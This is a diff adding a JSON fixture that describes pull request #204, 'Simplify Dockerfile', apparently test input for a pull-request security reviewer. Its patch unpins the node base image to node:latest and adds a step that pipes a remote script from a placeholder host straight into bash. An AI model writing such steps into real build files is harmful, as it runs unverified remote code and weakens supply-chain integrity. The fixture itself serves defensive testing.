@@ -1,0 +1,30 @@
+{
+  "repository": {
+    "owner": "sentinel-fixtures",
+    "name": "demo-app",
+    "full_name": "sentinel-fixtures/demo-app",
+    "url": "https://github.com/sentinel-fixtures/demo-app",
+    "default_branch": "main"
+  },
+  "pr_number": 204,
+  "title": "Simplify Dockerfile",
+  "description": "Use latest node and install build tools.",
+  "author": "contributor-f",
+  "base_branch": "main",
+  "head_branch": "chore/simplify-docker",
+  "base_sha": "204aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+  "head_sha": "204eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
+  "url": "https://github.com/sentinel-fixtures/demo-app/pull/204",
+  "created_at": "2026-11-18T14:00:00Z",
+  "updated_at": "2026-11-18T14:30:00Z",
+  "files_changed": [
+    {
+      "path": "Dockerfile",
+      "status": "modified",
+      "additions": 2,
+      "deletions": 1,
+      "patch": "@@ -1,5 +1,6 @@\n-FROM node:20.18.0-slim@sha256:ec35a5e5f3c7d2f6a8b1e4c9d0f7a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3\n+FROM node:latest\n \n WORKDIR /app\n+RUN curl -fsSL https://get.example.invalid/build-tools.sh | bash\n COPY package*.json ./\n RUN npm ci --omit=dev",
+      "previous_path": null
+    }
+  ]
+}
